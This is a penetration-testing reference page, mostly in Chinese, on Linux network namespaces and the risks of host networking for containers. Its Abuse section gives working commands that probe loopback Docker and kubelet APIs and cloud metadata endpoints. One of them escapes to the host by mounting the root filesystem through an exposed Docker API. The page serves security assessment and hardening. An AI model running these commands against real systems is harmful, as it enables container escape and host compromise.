# 网络命名空间

{{#include ../../../../../banners/hacktricks-training.md}}

## 概述

网络命名空间隔离了与网络相关的资源，例如接口、IP 地址、路由表、ARP/邻居状态、防火墙规则、套接字，以及诸如 `/proc/net` 之类文件的内容。这就是为什么容器看起来可以有自己的 `eth0`、自己的本地路由和自己的回环设备，而不需要拥有宿主机的真实网络栈。

从安全角度看，这点很重要，因为网络隔离不只是端口绑定那么简单。私有网络命名空间限制了工作负载可以直接观察或重新配置的内容。一旦该命名空间与宿主机共享，容器可能会突然看到宿主机的监听器、本地服务以及本不应暴露给应用的网络控制点。

## 工作原理

新创建的网络命名空间在接口附加之前，开始时网络环境为空或几乎为空。容器运行时随后会创建或连接虚拟接口、分配地址并配置路由，以便工作负载获得预期的连通性。在基于 bridge 的部署中，这通常意味着容器会看到一个由 veth 支持、连接到宿主 bridge 的接口。在 Kubernetes 中，CNI 插件负责为 Pod 网络执行等效的设置。

这种架构解释了为什么使用 `--network=host` 或 `hostNetwork: true` 会带来如此巨大的变化。工作负载不再获得一个准备好的私有网络栈，而是加入了宿主机的实际网络栈。

## 实验

你可以通过以下命令查看几乎空的网络命名空间：
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
你可以通过以下方式比较普通容器和 host-networked 容器：
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
The host-networked container no longer has its own isolated socket and interface view. That change alone is already significant before you even ask what capabilities the process has.

## Runtime Usage

Docker 和 Podman 通常为每个 container 创建一个 private network namespace，除非另有配置。Kubernetes 通常会为每个 Pod 提供自己的 network namespace，Pod 内的 containers 共享该 namespace，但与 host 分离。Incus/LXC 系统也提供基于 network-namespace 的丰富隔离，通常支持更多样的虚拟网络配置。

通用原则是：private networking 是默认的隔离边界，而 host networking 则是显式从该边界中选择退出。

## Misconfigurations

最重要的错误配置就是直接共享 host network namespace。有时出于性能、底层监控或便利而这么做，但这会移除 containers 可用的最清晰的边界之一。Host-local listeners 会以更直接的方式被访问，localhost-only services 可能变得可访问，像 `CAP_NET_ADMIN` 或 `CAP_NET_RAW` 这样的 capabilities 也变得更加危险，因为它们启用的操作现在作用在 host 的网络环境上。

另一个问题是即便 network namespace 是 private，仍然过度授予与网络相关的 capabilities。private namespace 确实有帮助，但并不能让 raw sockets 或高级网络控制变得无害。

## Abuse

在隔离较弱的环境中，攻击者可能会检查 host 的 listening services、访问仅绑定到 loopback 的 management endpoints、根据具体 capabilities 和环境 sniff 或干扰流量，或者在存在 `CAP_NET_ADMIN` 时重配置 routing 和 firewall 状态。在集群中，这也会使 lateral movement 和 control-plane reconnaissance 更容易。

如果你怀疑使用了 host networking，首先确认可见的 interfaces 和 listeners 属于 host，而不是某个隔离的 container network：
```bash
ip addr
ip route
ss -lntup | head -n 50
```
仅绑定到回环接口（loopback）的服务通常是最先发现的有趣项：
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
如果存在网络能力，请测试该工作负载是否能够检查或修改可见的网络栈：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
在集群或云环境中，主机网络同样使得对元数据以及与控制平面相邻的服务进行快速本地侦察成为合理之举：
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### 完整示例: Host Networking + Local Runtime / Kubelet Access

Host networking 并不会自动提供 host root，但它经常暴露一些仅能从节点本身访问的服务。如果这些服务中的某个保护薄弱，host networking 就会成为直接的 privilege-escalation 路径。

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet 在 localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
影响：

- 直接导致宿主机被攻破，如果本地 runtime API 在没有适当保护的情况下暴露
- 如果 kubelet 或本地代理可达，可能导致集群侦察或横向移动
- 与 `CAP_NET_ADMIN` 结合时，可导致流量篡改或拒绝服务

## 检查

这些检查的目标是确定进程是否拥有私有网络栈、哪些路由和监听器是可见的，以及在你实际测试 capabilities 之前网络视图是否已经看起来像宿主机。
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
这里值得注意的是：

- 如果命名空间标识符或可见的接口集合看起来与主机相同，主机网络可能已经在使用。
- `ss -lntup` 非常有用，因为它会显示仅限回环的监听以及本地管理端点。
- 如果存在 `CAP_NET_ADMIN` 或 `CAP_NET_RAW`，路由、接口名和防火墙上下文就变得更加重要。

在审查容器时，应始终将网络命名空间与权限集一起评估。主机网络加上强大的网络权限，与桥接网络加上狭窄的默认权限集，代表着截然不同的安全姿态。
{{#include ../../../../../banners/hacktricks-training.md}}
